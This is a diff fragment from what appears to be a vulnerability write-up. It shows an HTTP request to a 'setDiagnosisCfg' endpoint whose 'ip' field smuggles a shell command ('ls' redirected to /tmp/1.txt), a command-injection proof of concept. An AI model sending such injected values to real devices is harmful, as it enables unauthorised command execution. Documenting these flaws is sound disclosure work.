@@ -21,7 +21,6 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Cookie: SESSION_ID=2:1591951611:2
 Connection: close
-
 {"ip":"aaaa\tls>/tmp/1.txt","num":"2","topicurl":"setDiagnosisCfg"}  
 </code>
 
